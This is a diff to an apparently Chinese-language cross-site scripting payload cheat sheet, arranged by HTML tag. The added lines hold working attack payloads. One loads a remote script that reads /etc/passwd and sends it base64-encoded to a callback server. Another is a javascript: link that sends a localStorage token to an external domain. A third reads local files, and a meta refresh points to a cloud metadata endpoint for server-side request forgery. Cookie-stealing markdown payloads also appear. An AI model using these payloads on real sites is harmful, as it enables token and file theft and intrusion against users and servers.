@@ -248,6 +248,22 @@ JS有一个特性是Function()(); 大写的Function和小写的function其含义
     <img src="1"onerror=eval("alert('xss')")>
     <img src=1onmouseover=alert('xss')>
     <img STYLE="background-image:url(javascript:alert('XSS'))">
+  
+---  
+    <img src=x onerror="document.write('<script src=http://攻击者服务器ip9/test.js></script>')"/>
+    
+    # cat test.js
+    function reqListener () {
+    var encoded = encodeURI(this.responseText);
+    var b64 = btoa(this.responseText);
+    var raw = this.responseText;
+    document.write('<iframe src="反连服务器ip地址?data='+b64+'"></iframe>');
+    }
+    var oReq = new XMLHttpRequest();
+    oReq.addEventListener("load", reqListener);
+    oReq.open("GET", "file:///etc/passwd");
+    oReq.send();
+---
     
 ### a标签
 
@@ -259,6 +275,7 @@ JS有一个特性是Function()(); 大写的Function和小写的function其含义
     <a href="javascript:aaa"onmouseover="alert(/xss/)">aa</a>
     <a href=""onclick=eval(alert('xss'))>aa</a>
     <a href=kycg.asp?ttt=1000onmouseover=prompt('xss')y=2016>aa</a>
+    <a href=\"javascript:var xhr=new XMLHttpRequest(); xhr.open('GET', 'https://acnjnlnopp.dgrh3.cn/'+localStorage.getItem('SCW__TOKEN__'), true); xhr.send();\">aaa</a>
     
 ### input标签
 
@@ -323,6 +340,17 @@ JS有一个特性是Function()(); 大写的Function和小写的function其含义
     <script src="data:text/javascript,alert(630)"></script>
     <script>alert(630);</script>
     
+    <script>x=new XMLHttpRequest;x.onload=function()
+    {document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
+    
+### meta标签
+
+举例
+
+    <meta http-equiv="refresh" content="0;url=http://metadata.tencentyun.com/latest/meta-data" />
+    # 表示页面将在0秒后自动跳转到 http://metadata.tencentyun.com/latest/meta-data 这个地址
+
+    
 ## markdown的xss
 
 markdown语言从文本-指定格式的转换过程可以看作一系列的html转换，最终以html标签的形式存储在页面上，因此markdown编辑器也可能出现XSS漏洞
@@ -340,4 +368,3 @@ markdown语言从文本-指定格式的转换过程可以看作一系列的html�
     ![a'"`onerror=prompt(document.cookie)](x)\
     [citelol]: (javascript:prompt(document.cookie))
     
-## 
